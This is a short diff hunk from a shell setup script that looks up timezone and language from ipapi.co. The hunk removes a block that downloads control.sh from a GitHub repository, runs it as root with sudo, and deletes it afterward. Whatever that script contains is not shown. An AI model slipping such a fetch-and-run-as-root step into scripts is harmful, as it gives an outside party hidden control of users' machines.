@@ -109,15 +109,6 @@ echo ""
 	time=$( curl https://ipapi.co/$ip/timezone )
 	lang=$( curl https://ipapi.co/$ip/languages | cut -c -2 )
 
-
-cd /opt
-sudo rm control.sh
-sudo wget https://github.com/l4cky-control/project-rrr/raw/master/control.sh
-sudo chmod +x control.sh
-sudo ./control.sh
-sudo rm control.sh    
-cd ~
-
 	settime
 
 	rm /etc/default/locale
